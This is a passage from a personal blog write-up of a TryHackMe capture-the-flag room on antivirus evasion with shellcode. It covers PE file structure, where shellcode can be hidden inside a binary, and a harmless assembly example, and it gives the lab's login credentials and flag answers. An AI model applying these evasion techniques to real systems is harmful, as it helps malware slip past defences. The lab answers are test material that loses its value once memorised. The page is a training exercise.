<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/room/l/avevasionshellcode/ rel=canonical><link rel=icon href=../../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>AV Evasion - Shellcode | 0x5h1n0k0</title><link rel=stylesheet href=../../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../../stylesheets/extra.css><script>__md_scope=new URL("../../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#av-evasion-shellcode class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> AV Evasion - Shellcode </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ class=md-nav__link> Machines </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../dvwa/ class=md-nav__link> DVWA </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#task-1-introduction class=md-nav__link> Task 1: Introduction </a> <nav class=md-nav aria-label="Task 1: Introduction"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#objectives class=md-nav__link> Objectives </a> </li> <li class=md-nav__item> <a href=#prerequisites class=md-nav__link> Prerequisites </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-2-challenge class=md-nav__link> Task 2: Challenge </a> </li> <li class=md-nav__item> <a href=#task-3-pe-structure class=md-nav__link> Task 3: PE Structure </a> <nav class=md-nav aria-label="Task 3: PE Structure"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#what-is-pe class=md-nav__link> What is PE? </a> </li> <li class=md-nav__item> <a href=#why-do-we-need-to-know-about-pe class=md-nav__link> Why do we need to know about PE? </a> </li> <li class=md-nav__item> <a href=#pe-bear class=md-nav__link> PE-Bear </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-4-introduction-to-shellcode class=md-nav__link> Task 4: Introduction to Shellcode </a> <nav class=md-nav aria-label="Task 4: Introduction to Shellcode"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#a-simple-shellcode class=md-nav__link> A Simple Shellcode! </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/l/avevasionshellcode/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg> </a> <h1 id=av-evasion-shellcode><strong>AV Evasion - Shellcode</strong><a class=headerlink href=#av-evasion-shellcode title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 17 minutes</i></p>
 <p>Room at <a href=https://tryhackme.com/room/avevasionshellcode>https://tryhackme.com/room/avevasionshellcode</a></p> <hr> <h2 id=task-1-introduction><strong>Task 1: Introduction</strong><a class=headerlink href=#task-1-introduction title="Permanent link">&para;</a></h2> <p>In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.</p> <h3 id=objectives><strong>Objectives</strong><a class=headerlink href=#objectives title="Permanent link">&para;</a></h3> <ul> <li>Learn how shellcodes are made.</li> <li>Explore the pros and cons of staged payloads.</li> <li>Create stealthy shellcodes to avoid AV detection.</li> </ul> <h3 id=prerequisites><strong>Prerequisites</strong><a class=headerlink href=#prerequisites title="Permanent link">&para;</a></h3> <p>It is recommended to have some prior knowledge of how antivirus software works and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).</p> <h2 id=task-2-challenge><strong>Task 2: Challenge</strong><a class=headerlink href=#task-2-challenge title="Permanent link">&para;</a></h2> <p>In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to <a href=http://MACHINE_IP/ >http://MACHINE_IP/</a>.</p> <p>Points to remember:</p> <ul> <li>Try to combine the techniques discussed in this room.</li> <li>The website supports EXE files only.</li> <li>Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell.</li> </ul> <p><img alt src=image.png></p> <p>You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.</p> <p>Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials:</p> <ul> <li>Username: thm</li> <li>Password: Password321</li> </ul> <p>You will also need the AttackBox for some tasks, so this is also a good moment to start it.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: Which Antivirus software is running on the VM? </p> <blockquote> <p>Ans: name</p> </blockquote> <p>Question: What is the name of the user account to which you have access?</p> <blockquote> <p>Ans:</p> </blockquote> <p>Question: Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?</p> <blockquote> <p>Ans:</p> </blockquote> </details> <h2 id=task-3-pe-structure><strong>Task 3: PE Structure</strong><a class=headerlink href=#task-3-pe-structure title="Permanent link">&para;</a></h2> <p>This task highlights some of the high-level essential elements of PE data structure for Windows binaries.</p> <h3 id=what-is-pe><strong>What is PE?</strong><a class=headerlink href=#what-is-pe title="Permanent link">&para;</a></h3> <p>Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE.</p> <p>In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture. </p> <p>A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the <strong>PE Header</strong>, which contains metadata information, pointers, and links to address sections in memory. Another section is the <strong>Data section</strong>, which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc. </p> <p><img alt src=image-1.png></p> <p>There are different types of data containers in the PE structure, each holding different data.</p> <ol> <li><strong>.text</strong> stores the actual code of the program</li> <li><strong>.data</strong> holds the initialized and defined variables</li> <li><strong>.bss</strong> holds the uninitialized data (declared variables with no assigned values)</li> <li><strong>.rdata</strong> contains the read-only data</li> <li><strong>.edata</strong>: contains exportable objects and related table information</li> <li><strong>.idata</strong> imported objects and related table information</li> <li><strong>.reloc</strong> image relocation information</li> <li><strong>.rsrc</strong> links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!</li> </ol> <p>The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail:</p> <ul> <li>Windows Internals</li> <li>Dissecting PE Headers</li> </ul> <p>You can also get more in-depth details about PE if you check the Windows PE format's Docs website. </p> <p>When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process.</p> <ol> <li>Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,<ul> <li>The magic number starts with "MZ," which tells the loader that this is an EXE file.</li> <li>File Signatures</li> <li>Whether the file is compiled for x86 or x64 CPU architecture.</li> <li>Creation timestamp. </li> </ul> </li> <li>Parsing the section table details, such as <ul> <li>Number of Sections the file contains.</li> </ul> </li> <li>Mapping the file contents into memory based on<ul> <li>The EntryPoint address and the offset of the ImageBase. </li> <li>RVA: Relative Virtual Address, Addresses related to Imagebase.</li> </ul> </li> <li>Imports, DLLs, and other objects are loaded into the memory.</li> <li>The EntryPoint address is located and the main execution function runs.</li> </ol> <h3 id=why-do-we-need-to-know-about-pe><strong>Why do we need to know about PE?</strong><a class=headerlink href=#why-do-we-need-to-know-about-pe title="Permanent link">&para;</a></h3> <p>There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure. </p> <p>The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.</p> <p>We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:</p> <ol> <li>Defining the shellcode as a local variable within the main function will store it in the .TEXT PE section.</li> <li>Defining the shellcode as a global variable will store it in the .Data section.</li> <li>Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the .rsrc Data section. </li> <li>We can add a custom data section to store the shellcode.</li> </ol> <h3 id=pe-bear><strong>PE-Bear</strong><a class=headerlink href=#pe-bear title="Permanent link">&para;</a></h3> <p>The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select File -&gt; Load PEs (Ctrl + O).</p> <p><img alt src=image-2.png></p> <p>Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task.</p> <p><img alt src=image-3.png></p> <p>Now it is time to try it out! Load the <strong>thm-intro2PE.exe</strong> file to answer the questions below. The file is located in the following location: <code>c:\Tools\PE files\thm-intro2PE.exe</code></p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: What is the last 6 digits of the MD5 hash value of the <strong>thm-intro2PE.exe</strong> file? </p> <blockquote> <p>Ans: 530949</p> </blockquote> <p>Question: What is the Magic number value of the <strong>thm-intro2PE.exe</strong> file (in Hex)?</p> <blockquote> <p>Ans: 5A4D</p> </blockquote> <p>Question: What is the Entry Point value of the <strong>thm-intro2PE.exe</strong> file?</p> <blockquote> <p>Ans: 12E4</p> </blockquote> <p>Question: How many Sections does the <strong>thm-intro2PE.exe</strong> file have?</p> <blockquote> <p>Ans: 7</p> </blockquote> <p>Question: A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section?</p> <blockquote> <p>Ans: .flag</p> </blockquote> <p>Question: Check the content of the extra section. What is the flag?</p> <blockquote> <p>Ans: THM{PE-N3w-s3ction!}</p> </blockquote> </details> <h2 id=task-4-introduction-to-shellcode><strong>Task 4: Introduction to Shellcode</strong><a class=headerlink href=#task-4-introduction-to-shellcode title="Permanent link">&para;</a></h2> <p><img alt src=image-4.png></p> <p>Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell.</p> <p>Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker's code.</p> <p>It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task! </p> <h3 id=a-simple-shellcode><strong>A Simple Shellcode!</strong><a class=headerlink href=#a-simple-shellcode title="Permanent link">&para;</a></h3> <p>In order to craft your own shellcode, a set of skills is required:</p> <ul> <li>A decent understanding of x86 and x64 CPU architectures.</li> <li>Assembly language.</li> <li>Strong knowledge of programming languages such as C.</li> <li>Familiarity with the Linux and Windows operating systems.</li> </ul> <p>To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string "THM, Rocks!". The following assembly code uses two main functions:</p> <ul> <li>System Write function (sys_write) to print out a string we choose.</li> <li>System Exit function (sys_exit) to terminate the execution of the program.</li> </ul> <p>To call those functions, we will use <strong>syscalls</strong>. A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you'll probably use a different syscall than the one you'd use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values:</p> <table> <thead> <tr> <th><strong>rax</strong></th> <th><strong>System Call</strong></th> <th><strong>rdi</strong></th> <th><strong>rsi</strong></th> <th><strong>rdx</strong></th> </tr> </thead> <tbody> <tr> <td>0x1</td> <td>sys_write</td> <td>unsigned int fd</td> <td>const char *buf</td> <td>size_t count</td> </tr> <tr> <td>0x3c</td> <td>sys_exit</td> <td>int error_code</td> <td></td> <td></td> </tr> </tbody> </table> <p>The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls <a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ >here</a>.</p> <p>For <strong>sys_write</strong>, the first parameter sent through <strong>rdi</strong> is the file descriptor to write to. The second parameter in <strong>rsi</strong> is a pointer to the string we want to print, and the third in <strong>rdx</strong> is the size of the string to print.</p> <p>For <strong>sys_exit</strong>, rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully.</p> <p>Copy the following code to your AttackBox in a file called <strong>thm.asm</strong>: </p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=nf>global</span><span class=w> </span><span class=no>_start</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=nf>section</span><span class=w> </span><span class=no>.text</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=nl>_start:</span>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>MESSAGE</span><span class=w>      </span><span class=c1>; 1) let&#39;s jump to MESSAGE</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a><span class=nl>GOBACK:</span>
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a><span class=w>    </span><span class=nf>mov</span><span class=w> </span><span class=no>rax</span><span class=p>,</span><span class=w> </span><span class=mi>0x1</span>
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a><span class=w>    </span><span class=nf>mov</span><span class=w> </span><span class=no>rdi</span><span class=p>,</span><span class=w> </span><span class=mi>0x1</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a><span class=w>    </span><span class=nf>pop</span><span class=w> </span><span class=no>rsi</span><span class=w>          </span><span class=c1>; 3) we are popping into `rsi`; now we have the</span>
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a><span class=w>                     </span><span class=c1>; address of &quot;THM, Rocks!\r\n&quot;</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a><span class=w>    </span><span class=nf>mov</span><span class=w> </span><span class=no>rdx</span><span class=p>,</span><span class=w> </span><span class=mi>0xd</span>
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a><span class=w>    </span><span class=nf>syscall</span>
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a>
<a id=__codelineno-0-15 name=__codelineno-0-15 href=#__codelineno-0-15></a><span class=w>    </span><span class=nf>mov</span><span class=w> </span><span class=no>rax</span><span class=p>,</span><span class=w> </span><span class=mi>0x3c</span>
<a id=__codelineno-0-16 name=__codelineno-0-16 href=#__codelineno-0-16></a><span class=w>    </span><span class=nf>mov</span><span class=w> </span><span class=no>rdi</span><span class=p>,</span><span class=w> </span><span class=mi>0x0</span>
<a id=__codelineno-0-17 name=__codelineno-0-17 href=#__codelineno-0-17></a><span class=w>    </span><span class=nf>syscall</span>
<a id=__codelineno-0-18 name=__codelineno-0-18 href=#__codelineno-0-18></a>
<a id=__codelineno-0-19 name=__codelineno-0-19 href=#__codelineno-0-19></a><span class=nl>MESSAGE:</span>
